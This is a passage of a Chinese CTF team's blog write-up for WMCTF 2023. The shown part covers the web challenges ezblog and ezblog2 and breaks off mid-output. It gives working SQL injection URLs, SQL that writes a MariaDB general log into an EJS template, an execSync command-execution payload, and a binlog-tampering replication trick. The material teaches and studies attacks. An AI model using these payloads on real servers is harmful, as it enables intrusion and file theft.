<!doctype html><html lang=en itemscope itemtype=http://schema.org/WebPage><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,maximum-scale=1"><title>2023 WMCTF SU Write-Up -</title><meta name=description content="感谢 WM 的师傅们精心准备的比赛！本次比赛我们 SU 取得了 10nd 的成绩，感谢队里师傅们的辛苦付出！同时我们也在持续招人，只要你拥有一颗热爱 CTF 的心，都可以加入我们！欢迎发送个人简介至：suers_xctf@126.com
以下是我们 SU 本次 WMCTF 2023 的 writeup。"><meta name=author content="SUer"><script type=application/ld+json>{"@context":"http://schema.org","@type":"WebSite","name":"su-team","url":"https:\/\/su-team.cn\/"}</script><script type=application/ld+json>{"@context":"http://schema.org","@type":"Organization","name":"","url":"https:\/\/su-team.cn\/"}</script><script type=application/ld+json>{"@context":"http://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"https:\/\/su-team.cn\/","name":"home"}},{"@type":"ListItem","position":3,"item":{"@id":"https:\/\/su-team.cn\/post\/wmctf-2023-su-wu\/","name":"2023 wmctf su write up"}}]}</script><script type=application/ld+json>{"@context":"http://schema.org","@type":"Article","author":{"name":"SUer"},"headline":"2023 WMCTF SU Write-Up","description":"感谢 WM 的师傅们精心准备的比赛！本次比赛我们 SU 取得了 10nd 的成绩，感谢队里师傅们的辛苦付出！同时我们也在持续招人，只要你拥有一颗热爱 CTF 的心，都可以加入我们！欢迎发送个人简介至：suers_xctf@126.com\n以下是我们 SU 本次 WMCTF 2023 的 writeup。\n","inLanguage":"en","wordCount":8321,"datePublished":"2023-08-19T21:35:50\u002b00:00","dateModified":"2023-08-19T21:35:50\u002b00:00","image":"https:\/\/su-team.cn\/img\/SU.jpg","keywords":["WMCTF"],"mainEntityOfPage":"https:\/\/su-team.cn\/post\/wmctf-2023-su-wu\/","publisher":{"@type":"Organization","name":"https:\/\/su-team.cn\/","logo":{"@type":"ImageObject","url":"https:\/\/su-team.cn\/img\/SU.jpg","height":60,"width":60}}}</script><meta property="og:title" content="2023 WMCTF SU Write-Up"><meta property="og:description" content="感谢 WM 的师傅们精心准备的比赛！本次比赛我们 SU 取得了 10nd 的成绩，感谢队里师傅们的辛苦付出！同时我们也在持续招人，只要你拥有一颗热爱 CTF 的心，都可以加入我们！欢迎发送个人简介至：suers_xctf@126.com
以下是我们 SU 本次 WMCTF 2023 的 writeup。"><meta property="og:image" content="https://su-team.cn/img/SU.jpg"><meta property="og:url" content="https://su-team.cn/post/wmctf-2023-su-wu/"><meta property="og:type" content="website"><meta property="og:site_name" content="su-team"><meta name=twitter:title content="2023 WMCTF SU Write-Up"><meta name=twitter:description content="感谢 WM 的师傅们精心准备的比赛！本次比赛我们 SU 取得了 10nd 的成绩，感谢队里师傅们的辛苦付出！同时我们也在持续招人，只要你拥有一颗热爱 CTF 的心，都可以加入我们！欢迎发送个人简介至：suers_xctf@126.com
以下是我们 SU 本次 WMCTF 2023 的 writeup。"><meta name=twitter:image content="https://su-team.cn/img/SU.jpg"><meta name=twitter:card content="summary_large_image"><link href=https://su-team.cn/img/SU.jpg rel=icon type=image/x-icon><meta name=generator content="Hugo 0.148.2"><link rel=alternate href=https://su-team.cn/index.xml type=application/rss+xml title=su-team><link rel=stylesheet href=https://su-team.cn/css/katex.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/brands.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/fontawesome.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/regular.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/solid.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/svg.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/svg-with-js.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/v4-font-face.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/v4-shims.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/v5-font-face.min.css><link rel=stylesheet href=https://su-team.cn/css/bootstrap.min.css><link rel=stylesheet href=https://su-team.cn/css/main.css><link rel=stylesheet href=https://su-team.cn/css/fonts.css><link rel=stylesheet href=https://su-team.cn/css/syntax.css><link rel=stylesheet href=https://su-team.cn/css/codeblock.css><link rel=stylesheet href=https://su-team.cn/css/photoswipe.min.css><link rel=stylesheet href=https://su-team.cn/css/photoswipe.default-skin.min.css><style>.navbar-custom .avatar-container{width:58px;height:58px;margin-top:-29px;left:50%;transform:translateX(-50%);display:flex;align-items:center;justify-content:center;background:#fff;border-radius:50%;box-shadow:0 6px 18px rgba(0,0,0,.12)}.navbar-custom .avatar-container .avatar-img-border{width:100%;height:100%;border-radius:50%;overflow:hidden;margin:0;box-shadow:none}.navbar-custom .avatar-container .avatar-img{width:100%;height:100%;object-fit:cover;border-radius:50%}@media only screen and (min-width:768px){.navbar-custom .avatar-container{width:72px;height:72px;margin-top:-36px}}</style></head><body><nav class="navbar navbar-default navbar-fixed-top navbar-custom"><div class=container-fluid><div class=navbar-header><button type=button class=navbar-toggle data-toggle=collapse data-target=#main-navbar>
<span class=sr-only>Toggle navigation</span>
<span class=icon-bar></span>
<span class=icon-bar></span>
<span class=icon-bar></span>
</button>
<a class="theme-toggle mobile-theme-toggle" href=javascript:void(0) onclick=toggleTheme() title="Toggle Theme"><span class=sr-only>Toggle Theme</span>
<svg class="theme-icon-moon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
<svg class="theme-icon-sun" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg>
</a><a class=navbar-brand href=https://su-team.cn/>su-team</a></div><div class="collapse navbar-collapse" id=main-navbar><ul class="nav navbar-nav navbar-right"><li><a title=Archives href=/>Archives</a></li><li class=navlinks-container><a class=navlinks-parent role=button tabindex=0>Members</a><div class=navlinks-children><a href=/active-members>Members</a>
<a href=/pioneers>Pioneers</a></div></li><li><a title=About href=/page/about/>About</a></li><li><a title=Tags href=/tags>Tags</a></li><li class=hidden-xs><a href=javascript:void(0) class=theme-toggle onclick=toggleTheme() title="Toggle Theme"><span class=sr-only>Toggle Theme</span>
<svg class="theme-icon-moon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
<svg class="theme-icon-sun" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></a></li></ul></div></div></nav><script>(function(){const e=localStorage.getItem("theme"),t=window.matchMedia("(prefers-color-scheme: dark)").matches;e==="dark"||!e&&t?document.body.classList.add("dark-mode"):document.body.classList.remove("dark-mode")})();function toggleTheme(){const e=document.body;e.classList.toggle("dark-mode"),e.classList.contains("dark-mode")?localStorage.setItem("theme","dark"):localStorage.setItem("theme","light")}</script><style>.theme-toggle{cursor:pointer;padding:15px;display:flex;align-items:center}.mobile-theme-toggle{float:right;padding:15px 10px;margin-top:2px}@media(min-width:768px){.mobile-theme-toggle{display:none !important}}.theme-icon-moon,.theme-icon-sun{color:#777;transition:color .3s,transform .3s}.theme-toggle:hover .theme-icon-moon,.theme-toggle:hover .theme-icon-sun{color:#333}.theme-icon-sun{display:none}.theme-icon-moon{display:block}body.dark-mode .theme-icon-sun{display:block;color:#000}body.dark-mode .theme-icon-moon{display:none}body.dark-mode{filter:none !important;background-color:#1a1a1a !important}body.dark-mode header,body.dark-mode .container,body.dark-mode footer{filter:invert(1)hue-rotate(180deg)}body.dark-mode .navbar-custom{background-color:#1a1a1a !important;border-bottom:1px solid #333}body.dark-mode .navbar-custom .container-fluid{filter:invert(1)hue-rotate(180deg)}body.dark-mode img,body.dark-mode video,body.dark-mode iframe,body.dark-mode .avatar-img,body.dark-mode .navbar-custom .avatar-container{filter:invert(1)hue-rotate(180deg)}</style><div class=pswp tabindex=-1 role=dialog aria-hidden=true><div class=pswp__bg></div><div class=pswp__scroll-wrap><div class=pswp__container><div class=pswp__item></div><div class=pswp__item></div><div class=pswp__item></div></div><div class="pswp__ui pswp__ui--hidden"><div class=pswp__top-bar><div class=pswp__counter></div><button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
<button class="pswp__button pswp__button--share" title=Share></button>
<button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
<button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button><div class=pswp__preloader><div class=pswp__preloader__icn><div class=pswp__preloader__cut><div class=pswp__preloader__donut></div></div></div></div></div><div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap"><div class=pswp__share-tooltip></div></div><button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
</button>
<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button><div class=pswp__caption><div class=pswp__caption__center></div></div></div></div></div><header class=header-section><div class="intro-header no-img"><div class=container><div class=row><div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1"><div class=post-heading><h1>2023 WMCTF SU Write-Up</h1><span class=post-meta><i class="fas fa-calendar"></i>&nbsp;Posted on August 19, 190850
&nbsp;|&nbsp;<i class="fas fa-clock"></i>&nbsp;40&nbsp;min
&nbsp;|&nbsp;<i class="fas fa-book"></i>&nbsp;8321&nbsp;words
&nbsp;|&nbsp;<i class="fas fa-user"></i>&nbsp;SUer</span></div></div></div></div></div></header><div class=container role=main><div class="row flex-row"><div class="col-lg-3 col-lg-offset-0 col-md-3 col-md-offset-0 hidden-sm hidden-xs"><div class=toc-sidebar><h4 class=toc-title>#<br>TABLE OF CONTENTS</h4><div class=toc-card><nav id=TableOfContents><ul><li><a href=#web>Web</a><ul><li><a href=#ezblog>ezblog</a></li><li><a href=#ezblog2>ezblog2</a></li><li><a href=#anyfileread>AnyFileRead</a></li><li><a href=#ez_java_agagin>ez_java_agagin</a></li><li><a href=#你的权限放着我来>你的权限放着我来</a></li></ul></li><li><a href=#pwn>Pwn</a><ul><li><a href=#blindless>Blindless</a></li><li><a href=#jit>Jit</a></li></ul></li><li><a href=#re>Re</a><ul><li><a href=#ezandroid>ezAndroid</a></li><li><a href=#rightback>RightBack</a></li></ul></li><li><a href=#cry>Cry</a><ul><li><a href=#signin>signin</a></li><li><a href=#welcomesigner2>welcomesigner2</a></li><li><a href=#welcomesigner1>welcomesigner1</a></li><li><a href=#badprime>badprime</a></li></ul></li><li><a href=#misc>Misc</a><ul><li><a href=#oversharing>Oversharing</a></li><li><a href=#findme>FindMe</a></li><li><a href=#fantastic_terminal>Fantastic_terminal</a></li></ul></li><li><a href=#blockchain>Blockchain</a><ul><li><a href=#babyblock>babyblock</a></li></ul></li><li><a href=#steg>Steg</a><ul><li><a href=#ez_v1deo>EZ_v1deo</a></li><li><a href=#steglab1>StegLab1</a></li></ul></li></ul></nav></div></div></div><div class="col-lg-9 col-md-9"><article role=main class=blog-post><p>感谢 WM 的师傅们精心准备的比赛！本次比赛我们 SU 取得了 10nd 的成绩，感谢队里师傅们的辛苦付出！同时我们也在持续招人，只要你拥有一颗热爱 CTF 的心，都可以加入我们！欢迎发送个人简介至：<a href=mailto:suers_xctf@126.com>suers_xctf@126.com</a></p><p>以下是我们 SU 本次 WMCTF 2023 的 writeup。</p><h1 id=web>Web</h1><h2 id=ezblog>ezblog</h2><p>获取uuid，访问<code>/console</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Plain data-lang=Plain><span class=line><span class=cl>GET /post/0%20union%20select%20TO%5FBASE64%28load%5Ffile%28%22%2Fhome%2Fezblog%2F%2Epm2%2Flogs%2Fmain%2Dout%2Elog%22%29%29%2C%272%27%2C3/edit 
</span></span></code></pre></td></tr></table></div></div><p>利用/api/debugger/sql/execute路由，执行大部分SQL语句，因为<code>post.ejs</code>读写权限为777，所以设置mariadb的常规日志记录在<code>/home/ezblog/views/post.ejs</code></p><p>下面是利用到的sql语句，然后再利用<code>/api/debugger/template/test</code>路由访问<code>post.ejs</code>模板即可</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-SQL data-lang=SQL><span class=line><span class=cl><span class=k>CREATE</span><span class=w> </span><span class=k>DATABASE</span><span class=w> </span><span class=n>mysql</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>CREATE</span><span class=w> </span><span class=k>TABLE</span><span class=w> </span><span class=n>mysql</span><span class=p>.</span><span class=n>general_log</span><span class=p>(</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>event_time</span><span class=w> </span><span class=k>timestamp</span><span class=w> </span><span class=k>NOT</span><span class=w> </span><span class=k>NULL</span><span class=w> </span><span class=k>DEFAULT</span><span class=w> </span><span class=k>CURRENT_TIMESTAMP</span><span class=w> </span><span class=k>ON</span><span class=w> </span><span class=k>UPDATE</span><span class=w> </span><span class=k>CURRENT_TIMESTAMP</span><span class=p>,</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>user_host</span><span class=w> </span><span class=n>mediumtext</span><span class=w> </span><span class=k>NOT</span><span class=w> </span><span class=k>NULL</span><span class=p>,</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>thread_id</span><span class=w> </span><span class=nb>int</span><span class=p>(</span><span class=mi>11</span><span class=p>)</span><span class=w> </span><span class=k>NOT</span><span class=w> </span><span class=k>NULL</span><span class=p>,</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>server_id</span><span class=w> </span><span class=nb>int</span><span class=p>(</span><span class=mi>10</span><span class=p>)</span><span class=w> </span><span class=n>unsigned</span><span class=w> </span><span class=k>NOT</span><span class=w> </span><span class=k>NULL</span><span class=p>,</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>command_type</span><span class=w> </span><span class=nb>varchar</span><span class=p>(</span><span class=mi>64</span><span class=p>)</span><span class=w> </span><span class=k>NOT</span><span class=w> </span><span class=k>NULL</span><span class=p>,</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>argument</span><span class=w> </span><span class=n>mediumtext</span><span class=w> </span><span class=k>NOT</span><span class=w> </span><span class=k>NULL</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>)</span><span class=w> </span><span class=n>ENGINE</span><span class=o>=</span><span class=n>CSV</span><span class=w> </span><span class=k>DEFAULT</span><span class=w> </span><span class=n>CHARSET</span><span class=o>=</span><span class=n>utf8</span><span class=w> </span><span class=k>COMMENT</span><span class=o>=</span><span class=s1>&#39;General log&#39;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>set</span><span class=w> </span><span class=k>global</span><span class=w> </span><span class=n>general_log</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s2>&#34;ON&#34;</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>set</span><span class=w> </span><span class=k>global</span><span class=w> </span><span class=n>general_log_file</span><span class=o>=</span><span class=s1>&#39;/home/ezblog/views/post.ejs&#39;</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>&lt;=-</span><span class=w> </span><span class=k>global</span><span class=p>.</span><span class=n>process</span><span class=p>.</span><span class=n>mainModule</span><span class=p>.</span><span class=k>constructor</span><span class=p>.</span><span class=n>_load</span><span class=p>(</span><span class=o>`</span><span class=n>child_process</span><span class=o>`</span><span class=p>).</span><span class=n>execSync</span><span class=p>(</span><span class=o>`/</span><span class=n>readflag</span><span class=o>`</span><span class=p>).</span><span class=n>toString</span><span class=p>()</span><span class=w> </span><span class=o>=&gt;</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>参考连接：</p><p><a href=https://hxp.io/blog/101/hxp-CTF-2022-valentine/>https://hxp.io/blog/101/hxp-CTF-2022-valentine/</a></p><p><a href=https://www.sqlsec.com/2020/11/mysql.html#into-oufile-%E5%86%99-shell>https://www.sqlsec.com/2020/11/mysql.html#into-oufile-%E5%86%99-shell</a></p><h2 id=ezblog2>ezblog2</h2><p>大体思路一样，难点就于主从复制上，关闭主服务器的CRC32，手动修改Binary Log，导致从服务器执行SQL语句</p><p>获取uuid，访问<code>/console</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Plain data-lang=Plain><span class=line><span class=cl>GET /post/0%20union%20select%20TO%5FBASE64%28load%5Ffile%28%22%2Fhome%2Fezblog%2F%2Epm2%2Flogs%2Fmain%2Dout%2Elog%22%29%29%2C%272%27%2C3/edit 
</span></span></code></pre></td></tr></table></div></div><p>主服务器激活Binary Log</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Bash data-lang=Bash><span class=line><span class=cl><span class=c1>#/etc/my.cnf</span>
</span></span><span class=line><span class=cl><span class=c1>#</span>
</span></span><span class=line><span class=cl><span class=c1># This group is read both by the client and the server</span>
</span></span><span class=line><span class=cl><span class=c1># use it for options that affect everything</span>
</span></span><span class=line><span class=cl><span class=c1>#</span>
</span></span><span class=line><span class=cl><span class=o>[</span>client-server<span class=o>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>#</span>
</span></span><span class=line><span class=cl><span class=c1># include *.cnf from the config directory</span>
</span></span><span class=line><span class=cl><span class=c1>#</span>
</span></span><span class=line><span class=cl>!includedir /etc/my.cnf.d
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>mysqld<span class=o>]</span>
</span></span><span class=line><span class=cl><span class=nv>server_id</span>       <span class=o>=</span> <span class=m>2</span>
</span></span><span class=line><span class=cl><span class=nv>secure_file_priv</span><span class=o>=</span>
</span></span><span class=line><span class=cl>log-bin         <span class=o>=</span> mysql-bin
</span></span><span class=line><span class=cl><span class=nv>binlog_format</span> <span class=o>=</span> MIXED
</span></span></code></pre></td></tr></table></div></div><p>主服务器执行如下语句（我是用mycli连接的）</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-SQL data-lang=SQL><span class=line><span class=cl><span class=n>MariaDB</span><span class=w> </span><span class=n>root</span><span class=o>@</span><span class=p>(</span><span class=k>none</span><span class=p>):</span><span class=n>test</span><span class=o>&gt;</span><span class=w> </span><span class=k>set</span><span class=w> </span><span class=k>global</span><span class=w> </span><span class=n>binlog_checksum</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mi>0</span><span class=p>;</span><span class=w> </span><span class=o>#</span><span class=err>关闭主服务器的</span><span class=n>CRC32</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>MariaDB</span><span class=w> </span><span class=n>root</span><span class=o>@</span><span class=p>(</span><span class=k>none</span><span class=p>):</span><span class=n>test</span><span class=o>&gt;</span><span class=w> </span><span class=k>reset</span><span class=w> </span><span class=n>master</span><span class=p>;</span><span class=w> </span><span class=o>#</span><span class=err>删除所有二进制日志文件</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>MariaDB</span><span class=w> </span><span class=n>root</span><span class=o>@</span><span class=p>(</span><span class=k>none</span><span class=p>):</span><span class=n>test</span><span class=o>&gt;</span><span class=w> </span><span class=k>create</span><span class=w> </span><span class=k>database</span><span class=w> </span><span class=n>test</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>MariaDB</span><span class=w> </span><span class=n>root</span><span class=o>@</span><span class=p>(</span><span class=k>none</span><span class=p>):</span><span class=n>test</span><span class=o>&gt;</span><span class=w> </span><span class=k>CREATE</span><span class=w> </span><span class=k>TABLE</span><span class=w> </span><span class=n>employees</span><span class=w> </span><span class=p>(</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                        </span><span class=n>id</span><span class=w> </span><span class=nb>INT</span><span class=p>,</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                        </span><span class=n>name</span><span class=w> </span><span class=nb>VARCHAR</span><span class=p>(</span><span class=mi>100</span><span class=p>),</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                        </span><span class=n>age</span><span class=w> </span><span class=nb>INT</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                        </span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>MariaDB</span><span class=w> </span><span class=n>root</span><span class=o>@</span><span class=p>(</span><span class=k>none</span><span class=p>):</span><span class=n>test</span><span class=o>&gt;</span><span class=k>INSERT</span><span class=w> </span><span class=k>INTO</span><span class=w> </span><span class=n>employees</span><span class=p>(</span><span class=n>id</span><span class=p>,</span><span class=w> </span><span class=n>name</span><span class=p>,</span><span class=w> </span><span class=n>age</span><span class=p>)</span><span class=w> </span><span class=k>VALUES</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=w> </span><span class=s1>&#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#39;</span><span class=p>,</span><span class=w> </span><span class=mi>30</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>MariaDB</span><span class=w> </span><span class=n>root</span><span class=o>@</span><span class=p>(</span><span class=k>none</span><span class=p>):</span><span class=n>test</span><span class=o>&gt;</span><span class=k>create</span><span class=w> </span><span class=k>database</span><span class=w> </span><span class=n>test2</span><span class=p>;</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>因为Binary Log只记录如<a href=https://mariadb.com/kb/en/create/>CREATE</a>、<a href=https://mariadb.com/kb/en/alter/>ALTER</a>、<a href=https://mariadb.com/kb/en/insert/>INSERT</a>、<a href=https://mariadb.com/kb/en/update/>UPDATE</a>和<a href=https://mariadb.com/kb/en/delete/>DELETE</a>之类对数据有影响的语句，对数据没有影响的语句（如 SELECT 和 SHOW ）不会被记录，这里创建create database语句只是为了观察主从复制时是否出错，至关重要的是INSERT语句，要与payload长度一致</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-SQL data-lang=SQL><span class=line><span class=cl><span class=k>select</span><span class=w> </span><span class=s1>&#39;&lt;%= process.mainModule.require(&#34;child_process&#34;).execSync(&#34;/readflag&#34;).toString() %&gt;&#39;</span><span class=w> </span><span class=k>into</span><span class=w> </span><span class=n>outfile</span><span class=w> </span><span class=s1>&#39;/home/ezblog/views/114.ejs&#39;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>INSERT</span><span class=w> </span><span class=k>INTO</span><span class=w> </span><span class=n>employees</span><span class=p>(</span><span class=n>id</span><span class=p>,</span><span class=w> </span><span class=n>name</span><span class=p>,</span><span class=w> </span><span class=n>age</span><span class=p>)</span><span class=w> </span><span class=k>VALUES</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=w> </span><span class=s1>&#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#39;</span><span class=p>,</span><span class=w> </span><span class=mi>30</span><span class=p>)</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>找到binlog默认为<code>mysql-bin.000001</code>，我的binlog在<code>/var/lib/mysql/mysql-bin.000001</code>，用你喜欢的16进制编辑进行编辑，我这里随便找了个，替换INSERT INTO xxx部分</p><p><img src=/img/2023-08-19Wmctf/20230821210707797.jpg alt=img></p><p><img src=/img/2023-08-19Wmctf/20230821210708018.jpg alt=img></p><p>用官方的<code>mysqlbinlog</code>查看mysql-bin是否报错，没有就进行替换</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Bash data-lang=Bash><span class=line><span class=cl>mysqlbinlog mysql-bin.000001
</span></span><span class=line><span class=cl>sudo cp mysql-bin.000001 /var/lib/mysql/
</span></span></code></pre></td></tr></table></div></div><p>可以看到已经成功替换了</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-SQL data-lang=SQL><span class=line><span class=cl><span class=n>MariaDB</span><span class=w> </span><span class=n>root</span><span class=o>@</span><span class=p>(</span><span class=k>none</span><span class=p>):</span><span class=n>test</span><span class=o>&gt;</span><span class=w> </span><span class=k>SHOW</span><span class=w> </span><span class=n>BINLOG</span><span class=w> </span><span class=n>EVENTS</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>+</span><span class=c1>------------------+------+-------------------+-----------+-------------+----------------------------------------------------------------------------------------------------------------------------------------------------+
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=o>|</span><span class=w> </span><span class=n>Log_name</span><span class=w>         </span><span class=o>|</span><span class=w> </span><span class=n>Pos</span><span class=w>  </span><span class=o>|</span><span class=w> </span><span class=n>Event_type</span><span class=w>        </span><span class=o>|</span><span class=w> </span><span class=n>Server_id</span><span class=w> </span><span class=o>|</span><span class=w> </span><span class=n>End_log_pos</span><span class=w> </span><span class=o>|</span><span class=w> </span><span class=n>Info</span><span class=w>                                                                                                                                               </span><span class=o>|</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>+</span><span class=c1>------------------+------+-------------------+-----------+-------------+----------------------------------------------------------------------------------------------------------------------------------------------------+
